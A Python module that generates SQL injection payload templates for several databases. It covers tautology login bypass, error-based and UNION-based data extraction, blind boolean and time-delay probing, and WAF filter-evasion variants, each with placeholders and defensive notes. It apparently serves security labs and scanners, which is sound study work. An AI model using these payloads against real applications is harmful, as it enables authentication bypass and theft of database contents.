"""
SQL Injection Module - Simulation Mode / Lab & Scanner Examples

Reference: OWASP SQL Injection
https://owasp.org/www-community/attacks/SQL_Injection

SIMULATION MODE — These are string examples used in security labs and scanners.
They demonstrate SQLi syntax and structure for study purposes only.

PLACEHOLDER NOTATION:
  [VALUE]     — substitute with a test value (string or number)
  [COLUMN]    — substitute with a column name to enumerate
  [TABLE]     — substitute with a target table name
  [DB_FUNC]   — substitute with a DB-specific function call
  [CONDITION] — substitute with a boolean test expression
  [N]         — substitute with an integer (column count, sleep seconds, etc.)

NO LIVE DATABASE INTERACTION — strings are inert until placed in a real query.
"""


class SQLiPayloadGenerator:
    """Generate SQLi simulation strings for lab and scanner study"""

    def __init__(self, db_type='mysql'):
        self.db_type = db_type.lower()
        self.comment  = self._get_comment()

    def _get_comment(self):
        """Primary inline comment syntax per database"""
        return {
            'mysql':      '--+',
            'postgresql': '--',
            'mssql':      '--',
            'oracle':     '--',
        }.get(self.db_type, '--')

    def generate_all_types(self):
        payloads = []
        payloads.extend(self._generate_error_based())
        payloads.extend(self._generate_union_based())
        payloads.extend(self._generate_blind_boolean())
        payloads.extend(self._generate_blind_time())
        payloads.extend(self._generate_bypass_techniques())
        return payloads

    # ------------------------------------------------------------------ #
    #  ERROR-BASED                                                          #
    # ------------------------------------------------------------------ #
    def _generate_error_based(self):
        """
        Error-based SQLi — forces the DB engine to include sensitive data
        inside an error message that is then reflected to the user.
        Study use: understand how error leakage reveals schema information.
        """
        c = self.comment
        payloads = [
            {
                'type': 'SQLi',
                'subtype': 'Error-based',
                'mode': 'Simulation',
                'db_type': self.db_type,
                'payload': f"' OR '[VALUE]'='[VALUE]",
                'description': (
                    'LAB EXAMPLE — Classic tautology string. '
                    'In a login query like: WHERE user=\'[INPUT]\' AND pass=\'...\' '
                    'this makes the WHERE clause always TRUE, bypassing the check.'
                ),
                'simulation_note': "Replace [VALUE] with any matching string, e.g. 'a'='a'. No DB interaction in this string.",
                'bypass_explanation': "Creates an always-true condition. Any row matches, so the first DB record is returned.",
                'defensive_notes': 'Parameterized queries make this completely inert. Never build SQL by string concatenation.',
            },
            {
                'type': 'SQLi',
                'subtype': 'Error-based',
                'mode': 'Simulation',
                'db_type': self.db_type,
                'payload': f"' OR [N]=[N]{c}",
                'description': (
                    'LAB EXAMPLE — Numeric tautology with trailing comment. '
                    'The comment symbol discards the rest of the original query '
                    '(e.g. the password check), leaving only the always-true condition.'
                ),
                'simulation_note': f'Replace [N] with any equal integers, e.g. 1=1. Comment syntax for this DB: {c}',
                'bypass_explanation': f'Comment character {c} silences the remainder of the query on the same line.',
                'defensive_notes': 'Use prepared statements. Input validation that rejects -- # and /**/ reduces risk but is not sufficient alone.',
            },
            {
                'type': 'SQLi',
                'subtype': 'Error-based',
                'mode': 'Simulation',
                'db_type': self.db_type,
                'payload': f"admin'{c}",
                'description': (
                    'LAB EXAMPLE — Username-field comment injection. '
                    'Places a known username then uses a comment to discard '
                    'the AND password=... clause entirely.'
                ),
                'simulation_note': f"Replace admin with target username. {c} discards password check.",
                'bypass_explanation': 'The password portion of the query is commented out; only the username needs to match.',
                'defensive_notes': 'Parameterized queries bind each value independently — comment characters become literal data.',
            },
        ]

        # DB-specific error-disclosure patterns
        if self.db_type == 'mysql':
            payloads.append({
                'type': 'SQLi',
                'subtype': 'Error-based — MySQL extractvalue',
                'mode': 'Simulation',
                'db_type': 'mysql',
                'payload': f"' AND extractvalue([N],concat(0x7e,[DB_FUNC])){c}",
                'description': (
                    'LAB EXAMPLE — MySQL XPath error disclosure pattern. '
                    'extractvalue() raises an XPATH error when the second argument '
                    'is not valid XPath; the error message includes the evaluated result. '
                    'Scanners use this pattern to read DB values from error output.'
                ),
                'simulation_note': 'Replace [N] with 1, [DB_FUNC] with e.g. version() or database(). String is inert without a live query.',
                'bypass_explanation': 'Error message is reflected to the user; concat(0x7e, ...) prefixes result with ~ for easy parsing.',
                'defensive_notes': 'Disable detailed DB error output in production. Return only generic error messages to users.',
            })

        elif self.db_type == 'mssql':
            payloads.append({
                'type': 'SQLi',
                'subtype': 'Error-based — MSSQL CONVERT',
                'mode': 'Simulation',
                'db_type': 'mssql',
                'payload': f"' AND [N]=CONVERT(int,[DB_FUNC]){c}",
                'description': (
                    'LAB EXAMPLE — MSSQL type-conversion error disclosure. '
                    'CONVERT(int, <string_value>) raises a type-mismatch error '
                    'that includes the string value being converted. '
                    'Scanners read the version or config from the error text.'
                ),
                'simulation_note': 'Replace [N] with 1, [DB_FUNC] with @@version or DB_NAME(). Inert without a live query.',
                'bypass_explanation': 'Implicit type conversion fails loudly; the error message leaks the string value.',
                'defensive_notes': 'Configure custom error pages. Log errors server-side; never expose stack traces to users.',
            })

        elif self.db_type == 'postgresql':
            payloads.append({
                'type': 'SQLi',
                'subtype': 'Error-based — PostgreSQL CAST',
                'mode': 'Simulation',
                'db_type': 'postgresql',
                'payload': f"' AND [N]=CAST([DB_FUNC] AS int){c}",
                'description': (
                    'LAB EXAMPLE — PostgreSQL CAST error disclosure. '
                    'Casting a string to int raises an error containing the '
                    'original string value. Used by scanners to extract data '
                    'via the error channel.'
                ),
                'simulation_note': 'Replace [N] with 1, [DB_FUNC] with version() or current_database(). Inert without a live query.',
                'bypass_explanation': 'Failed CAST includes the source value in the error message.',
                'defensive_notes': 'Never display raw DB errors. Use exception handling that logs internally and shows generic messages.',
            })

        return payloads

    # ------------------------------------------------------------------ #
    #  UNION-BASED                                                          #
    # ------------------------------------------------------------------ #
    def _generate_union_based(self):
        """
        Union-based SQLi — appends a second SELECT to retrieve data
        from other tables when the result set is displayed to the user.
        Study use: understand column-count enumeration and data extraction flow.
        """
        c = self.comment
        payloads = [
            {
                'type': 'SQLi',
                'subtype': 'Union-based — column count probe',
                'mode': 'Simulation',
                'db_type': self.db_type,
                'payload': f"' ORDER BY [N]{c}",
                'description': (
                    'LAB EXAMPLE — ORDER BY column-count probe. '
                    'Increment [N] until the query errors; the last non-error '
                    'value reveals the number of columns. Required before a '
                    'UNION SELECT can be constructed.'
                ),
                'simulation_note': 'Replace [N] with 1, 2, 3 ... until error. Inert without live query.',
                'bypass_explanation': 'ORDER BY [N] errors when N exceeds the column count; this reveals the exact column count.',
                'defensive_notes': 'Parameterized queries prevent UNION injection entirely. Validate that inputs are expected types.',
            },
            {
                'type': 'SQLi',
                'subtype': 'Union-based — NULL column probe',
                'mode': 'Simulation',
                'db_type': self.db_type,
                'payload': f"' UNION SELECT NULL,NULL,NULL{c}",
                'description': (
                    'LAB EXAMPLE — UNION SELECT with NULL placeholders. '
                    'NULL is compatible with every data type, so this succeeds '
                    'once the column count matches the original query. '
                    'Scanners use this to confirm injectable UNION.'
                ),
                'simulation_note': 'Add or remove NULLs until no error. Inert without live query.',
                'bypass_explanation': 'NULLs avoid type-mismatch errors during column-count enumeration.',
                'defensive_notes': 'Restrict DB user permissions. Apply parameterized queries.',
            },
            {
                'type': 'SQLi',
                'subtype': 'Union-based — data extraction',
                'mode': 'Simulation',
                'db_type': self.db_type,
                'payload': f"' UNION SELECT [COLUMN],NULL FROM [TABLE]{c}",
                'description': (
                    'LAB EXAMPLE — UNION SELECT data extraction template. '
                    'Once column count is known, substitute real column and '
                    'table names to retrieve data from any accessible table.'
                ),
                'simulation_note': 'Replace [COLUMN] with e.g. username, [TABLE] with e.g. users. Inert without live query.',
                'bypass_explanation': 'UNION appends rows from a second query; the application displays both result sets.',
                'defensive_notes': 'Least-privilege DB user should not have SELECT on sensitive tables. Use parameterized queries.',
            },
        ]

        # DB-specific schema enumeration patterns
        if self.db_type == 'mysql':
            payloads.extend([
                {
                    'type': 'SQLi',
                    'subtype': 'Union-based — MySQL schema enumeration',
                    'mode': 'Simulation',
                    'db_type': 'mysql',
                    'payload': f"' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema=database(){c}",
                    'description': (
                        'LAB EXAMPLE — MySQL table name enumeration via information_schema. '
                        'information_schema.tables is readable by all users by default. '
                        'Scanners query it to map the full DB schema.'
                    ),
                    'simulation_note': 'Inert without live DB. Demonstrates how scanners auto-map schema post-injection.',
                    'bypass_explanation': 'information_schema is a metadata DB accessible to all authenticated MySQL users.',
                    'defensive_notes': 'Restrict information_schema access where possible. Use parameterized queries.',
                },
                {
                    'type': 'SQLi',
                    'subtype': 'Union-based — MySQL system info',
                    'mode': 'Simulation',
                    'db_type': 'mysql',
                    'payload': f"' UNION SELECT NULL,concat([DB_FUNC],0x3a,[DB_FUNC]){c}",
                    'description': (
                        'LAB EXAMPLE — MySQL system-info concat pattern. '
                        '0x3a is a hex colon used as a separator. '
                        'Scanners use this to retrieve two values in one column.'
                    ),
                    'simulation_note': 'Replace [DB_FUNC] with e.g. user(), database(), version(). Inert without live query.',
                    'bypass_explanation': 'concat() merges two values; hex 0x3a separates them for easy parsing in output.',
                    'defensive_notes': 'Use parameterized queries. Revoke unnecessary function execution privileges.',
                },
            ])

        elif self.db_type == 'postgresql':
            payloads.append({
                'type': 'SQLi',
                'subtype': 'Union-based — PostgreSQL schema enumeration',
                'mode': 'Simulation',
                'db_type': 'postgresql',
                'payload': f"' UNION SELECT table_name,NULL FROM information_schema.tables{c}",
                'description': (
                    'LAB EXAMPLE — PostgreSQL table enumeration via information_schema. '
                    'Same standard schema as MySQL; used identically by scanners.'
                ),
                'simulation_note': 'Inert without live DB. Demonstrates schema-mapping step in scanner workflow.',
                'bypass_explanation': 'PostgreSQL also exposes information_schema; column names are identical to MySQL.',
                'defensive_notes': 'Use prepared statements. Restrict DB user to only the tables the application needs.',
            })

        elif self.db_type == 'mssql':
            payloads.append({
                'type': 'SQLi',
                'subtype': 'Union-based — MSSQL schema enumeration',
                'mode': 'Simulation',
                'db_type': 'mssql',
                'payload': f"' UNION SELECT name,NULL FROM sysobjects WHERE xtype='U'{c}",
                'description': (
                    'LAB EXAMPLE — MSSQL user-table enumeration via sysobjects. '
                    "xtype='U' filters for user-created tables. "
                    'Scanners use this as an alternative to information_schema on MSSQL.'
                ),
                'simulation_note': "Inert without live DB. xtype='U' = user tables only.",
                'bypass_explanation': 'sysobjects is the legacy MSSQL catalog; sysobjects and sys.objects are both accessible.',
                'defensive_notes': 'Restrict catalog access. Use parameterized queries and stored procedures with least privilege.',
            })

        return payloads

    # ------------------------------------------------------------------ #
    #  BLIND — BOOLEAN-BASED                                               #
    # ------------------------------------------------------------------ #
    def _generate_blind_boolean(self):
        """
        Boolean-based blind SQLi — no data in response; attacker infers
        information by observing TRUE vs FALSE application behaviour.
        Study use: understand binary-search data-extraction logic.
        """
        c = self.comment
        return [
            {
                'type': 'SQLi',
                'subtype': 'Blind Boolean — TRUE condition baseline',
                'mode': 'Simulation',
                'db_type': self.db_type,
                'payload': f"' AND [N]=[N]{c}",
                'description': (
                    'LAB EXAMPLE — TRUE condition baseline for blind SQLi. '
                    'If the page response differs from the FALSE condition below, '
                    'the parameter is injectable. This is step 1 in scanner probing.'
                ),
                'simulation_note': 'Replace [N] with equal values e.g. 1=1. Page should respond normally (TRUE path).',
                'bypass_explanation': 'Tautology always evaluates TRUE. Normal page response confirms WHERE clause is reached.',
                'defensive_notes': 'Parameterized queries prevent this. Ensure application returns identical responses for valid/invalid data.',
            },
            {
                'type': 'SQLi',
                'subtype': 'Blind Boolean — FALSE condition baseline',
                'mode': 'Simulation',
                'db_type': self.db_type,
                'payload': f"' AND [N]=[N+1]{c}",
                'description': (
                    'LAB EXAMPLE — FALSE condition baseline for blind SQLi. '
                    'If this produces a different response than the TRUE condition, '
                    'the application leaks boolean information — confirming blind injection.'
                ),
                'simulation_note': 'Replace [N]=[N+1] with unequal values e.g. 1=2. Page should differ from TRUE baseline.',
                'bypass_explanation': 'Contradiction always evaluates FALSE. Different response confirms injectable AND clause.',
                'defensive_notes': 'Return identical error/empty responses for all invalid data. Do not expose row-count differences.',
            },
            {
                'type': 'SQLi',
                'subtype': 'Blind Boolean — character extraction',
                'mode': 'Simulation',
                'db_type': self.db_type,
                'payload': f"' AND SUBSTRING([DB_FUNC],[N],[N])='[VALUE]'{c}",
                'description': (
                    'LAB EXAMPLE — Character-by-character extraction via SUBSTRING. '
                    'Scanners automate this: iterate [N] for position, binary-search [VALUE] '
                    'for the ASCII character. Repeating over all positions extracts '
                    'full strings (DB name, version, usernames) one character at a time.'
                ),
                'simulation_note': 'Replace [DB_FUNC] with database()/version(), [N] with position index, [VALUE] with test char. Inert without live query.',
                'bypass_explanation': 'Binary search over 127 ASCII values needs ~7 requests per character. Automated scanners complete full strings in seconds.',
                'defensive_notes': 'Prepared statements block this. Rate limiting and anomaly detection slow automated scanners but do not fix the root cause.',
            },
            {
                'type': 'SQLi',
                'subtype': 'Blind Boolean — length probe',
                'mode': 'Simulation',
                'db_type': self.db_type,
                'payload': f"' AND LENGTH([DB_FUNC])>[N]{c}",
                'description': (
                    'LAB EXAMPLE — String-length probe. '
                    'Scanners binary-search [N] to find the exact length of a '
                    'target string before beginning character extraction. '
                    'Reduces total requests needed.'
                ),
                'simulation_note': 'Replace [DB_FUNC] with database() or user(). Increment [N] until FALSE response to find length.',
                'bypass_explanation': 'LENGTH probe sets up efficient SUBSTRING enumeration by bounding the search space.',
                'defensive_notes': 'Consistent, parameterized queries prevent all boolean-channel leakage.',
            },
        ]

    # ------------------------------------------------------------------ #
    #  BLIND — TIME-BASED                                                   #
    # ------------------------------------------------------------------ #
    def _generate_blind_time(self):
        """
        Time-based blind SQLi — infers data via deliberate query delay.
        Study use: understand out-of-band inference when no response diff exists.
        SIMULATION ONLY — [DELAY_SECONDS] placeholder prevents real execution.
        """
        c = self.comment
        payloads = []

        if self.db_type == 'mysql':
            payloads.extend([
                {
                    'type': 'SQLi',
                    'subtype': 'Blind Time-based — MySQL SLEEP probe',
                    'mode': 'Simulation',
                    'db_type': 'mysql',
                    'payload': f"' AND SLEEP([DELAY_SECONDS]){c}",
                    'description': (
                        'LAB EXAMPLE — MySQL unconditional delay probe. '
                        'SLEEP([DELAY_SECONDS]) pauses the query for N seconds. '
                        'If the HTTP response is delayed by ~N seconds, the parameter '
                        'is injectable. This is the first time-based probe scanners send.'
                    ),
                    'simulation_note': '[DELAY_SECONDS] is a placeholder — string does NOT execute. In a lab substitute e.g. 2.',
                    'bypass_explanation': 'Response delay is measurable even when page content is identical for TRUE/FALSE.',
                    'defensive_notes': 'Parameterized queries prevent this. Monitor for unusually slow queries in DB logs.',
                },
                {
                    'type': 'SQLi',
                    'subtype': 'Blind Time-based — MySQL conditional SLEEP',
                    'mode': 'Simulation',
                    'db_type': 'mysql',
                    'payload': f"' AND IF([CONDITION],SLEEP([DELAY_SECONDS]),0){c}",
                    'description': (
                        'LAB EXAMPLE — MySQL conditional delay for data extraction. '
                        'IF(condition, delay, no-delay) means: delay only occurs when '
                        'the condition is TRUE. Scanners use this to perform the same '
                        'binary-search extraction as boolean-blind, but via the time channel.'
                    ),
                    'simulation_note': 'Replace [CONDITION] with e.g. SUBSTRING(database(),1,1)=\'a\'. [DELAY_SECONDS] stays as placeholder.',
                    'bypass_explanation': 'Conditional delay leaks one bit per request. Automation extracts full strings via repeated timing measurements.',
                    'defensive_notes': 'Prepared statements are the only reliable fix. Timeouts at application layer reduce impact but not root cause.',
                },
            ])

        elif self.db_type == 'postgresql':
            payloads.append({
                'type': 'SQLi',
                'subtype': 'Blind Time-based — PostgreSQL pg_sleep probe',
                'mode': 'Simulation',
                'db_type': 'postgresql',
                'payload': f"' AND pg_sleep([DELAY_SECONDS]){c}",
                'description': (
                    'LAB EXAMPLE — PostgreSQL pg_sleep delay probe. '
                    'pg_sleep([DELAY_SECONDS]) is the PostgreSQL equivalent of MySQL SLEEP. '
                    'Confirms injectable parameter when HTTP response is delayed.'
                ),
                'simulation_note': '[DELAY_SECONDS] is a placeholder. Inert without live DB connection.',
                'bypass_explanation': 'pg_sleep is always available to authenticated PostgreSQL users.',
                'defensive_notes': 'Prepared statements block this. Revoke pg_sleep access if not operationally required.',
            })

        elif self.db_type == 'mssql':
            payloads.append({
                'type': 'SQLi',
                'subtype': 'Blind Time-based — MSSQL WAITFOR DELAY',
                'mode': 'Simulation',
                'db_type': 'mssql',
                'payload': f"'; WAITFOR DELAY '0:0:[DELAY_SECONDS]'{c}",
                'description': (
                    'LAB EXAMPLE — MSSQL WAITFOR DELAY probe. '
                    "WAITFOR DELAY '0:0:N' pauses execution for N seconds. "
                    'The leading ; terminates the original statement to allow '
                    'a second statement (stacked query).'
                ),
                'simulation_note': "[DELAY_SECONDS] is a placeholder — string is inert. Stacked queries require MSSQL + multi-statement driver.",
                'bypass_explanation': 'MSSQL supports stacked queries by default; the ; separates statements in a single execute call.',
                'defensive_notes': 'Use parameterized queries and disable stacked queries at driver level where possible.',
            })

        elif self.db_type == 'oracle':
            payloads.append({
                'type': 'SQLi',
                'subtype': 'Blind Time-based — Oracle DBMS_PIPE delay',
                'mode': 'Simulation',
                'db_type': 'oracle',
                'payload': f"' AND [N]=(SELECT [N] FROM dual WHERE DBMS_PIPE.RECEIVE_MESSAGE(('x'),[DELAY_SECONDS])=[N]){c}",
                'description': (
                    'LAB EXAMPLE — Oracle time-delay via DBMS_PIPE. '
                    'DBMS_PIPE.RECEIVE_MESSAGE blocks for [DELAY_SECONDS] seconds '
                    'waiting for a pipe message that never arrives. '
                    'This is the standard Oracle time-based probe in scanners like sqlmap.'
                ),
                'simulation_note': '[DELAY_SECONDS] is a placeholder. Requires EXECUTE on DBMS_PIPE — not granted by default.',
                'bypass_explanation': 'Oracle lacks a simple SLEEP(); DBMS_PIPE is the common alternative used by automated scanners.',
                'defensive_notes': 'Revoke EXECUTE on DBMS_PIPE. Use parameterized queries. Least-privilege DB accounts.',
            })

        return payloads

    # ------------------------------------------------------------------ #
    #  BYPASS / FILTER EVASION                                             #
    # ------------------------------------------------------------------ #
    def _generate_bypass_techniques(self):
        """
        Demonstrates SQLi filter-evasion techniques used in scanners.
        Study use: understand why denylist WAF rules fail.
        """
        c = self.comment
        return [
            {
                'type': 'SQLi',
                'subtype': 'Bypass — inline comment as space',
                'mode': 'Simulation',
                'db_type': self.db_type,
                'payload': f"admin'/**/OR/**/[N]=[N]{c}",
                'description': (
                    'LAB EXAMPLE — Inline comment /**/ used in place of spaces. '
                    'SQL parsers strip /**/ as a comment; the resulting query is valid. '
                    'WAF rules checking for " OR " with literal spaces miss this.'
                ),
                'simulation_note': 'Replace [N]=[N] with equal values. Inert without live query.',
                'bypass_explanation': '/**/ is a zero-length SQL comment; the DB sees "admin OR 1=1--+" after parsing.',
                'defensive_notes': 'Normalise whitespace and strip comments before WAF pattern matching. Use parameterized queries.',
            },
            {
                'type': 'SQLi',
                'subtype': 'Bypass — case variation',
                'mode': 'Simulation',
                'db_type': self.db_type,
                'payload': f"' oR '[VALUE]'='[VALUE]",
                'description': (
                    'LAB EXAMPLE — Mixed-case SQL keyword to bypass case-sensitive filters. '
                    'SQL keywords are case-insensitive; "oR" executes identically to "OR". '
                    'WAFs checking for uppercase "OR" miss lowercase or mixed variants.'
                ),
                'simulation_note': 'Replace [VALUE] with matching strings e.g. a. SQL is case-insensitive for keywords.',
                'bypass_explanation': 'SQL standard: keywords are case-insensitive. Filters are often case-sensitive.',
                'defensive_notes': 'Normalise to uppercase before WAF matching. Use parameterized queries — the correct fix.',
            },
            {
                'type': 'SQLi',
                'subtype': 'Bypass — UNION ALL variant',
                'mode': 'Simulation',
                'db_type': self.db_type,
                'payload': f"' UNION ALL SELECT NULL,NULL{c}",
                'description': (
                    'LAB EXAMPLE — UNION ALL instead of UNION. '
                    'UNION deduplicates rows; UNION ALL does not. '
                    'Some WAF rules match "UNION SELECT" but miss "UNION ALL SELECT".'
                ),
                'simulation_note': 'Functionally identical to UNION SELECT for injection; ALL keyword evades specific WAF signatures.',
                'bypass_explanation': 'UNION ALL is a valid SQL construct; WAFs with incomplete keyword lists miss it.',
                'defensive_notes': 'Comprehensive keyword normalisation required. Parameterized queries are immune to all UNION variants.',
            },
            {
                'type': 'SQLi',
                'subtype': 'Bypass — URL-encoded quote',
                'mode': 'Simulation',
                'db_type': self.db_type,
                'payload': "%27 OR %27[VALUE]%27=%27[VALUE]",
                'description': (
                    'LAB EXAMPLE — URL-encoded single quote. '
                    '%27 is the URL encoding of \'. '
                    'If the application decodes URL parameters before the WAF inspects them, '
                    'the WAF sees %27 (harmless) but the DB receives \' (dangerous).'
                ),
                'simulation_note': '%27 = single quote. Decoded by web server before DB query is built. Replace [VALUE] with test string.',
                'bypass_explanation': 'WAF sits in front and sees encoded input; backend decodes before parameterising — ordering flaw.',
                'defensive_notes': 'Decode input fully before WAF inspection. Use parameterized queries regardless of encoding state.',
            },
            {
                'type': 'SQLi',
                'subtype': 'Bypass — hex string literal',
                'mode': 'Simulation',
                'db_type': self.db_type,
                'payload': f"' OR [COLUMN]=0x[HEX_VALUE]{c}",
                'description': (
                    "LAB EXAMPLE — Hex-literal string to bypass quote-stripping filters. "
                    "MySQL (and others) accept 0xHEX as a string literal. "
                    "Filters that strip quotes can't strip a hex literal that contains no quotes."
                ),
                'simulation_note': 'Replace [COLUMN] with target column, [HEX_VALUE] with hex-encoded target string e.g. 61646d696e = admin.',
                'bypass_explanation': "0x hex literals are valid string values in MySQL. Quote-stripping defences don't affect them.",
                'defensive_notes': 'Parameterized queries bind values by type — hex literals become inert bound parameters.',
            },
            {
                'type': 'SQLi',
                'subtype': 'Bypass — scientific notation integer',
                'mode': 'Simulation',
                'db_type': self.db_type,
                'payload': f"' OR [COLUMN]=1e0{c}",
                'description': (
                    'LAB EXAMPLE — Scientific notation as numeric bypass. '
                    'Some DBs accept 1e0 (= 1.0) as a numeric literal. '
                    'Filters blocking "1=1" miss "1e0=1e0" or "[COLUMN]=1e0".'
                ),
                'simulation_note': 'Replace [COLUMN] with a numeric column name. 1e0 = float 1.0 in MySQL/PostgreSQL.',
                'bypass_explanation': 'Filters scanning for digit=digit patterns miss scientific notation equivalents.',
                'defensive_notes': 'Normalise numeric representations before filtering. Parameterized queries handle all numeric forms correctly.',
            },
        ]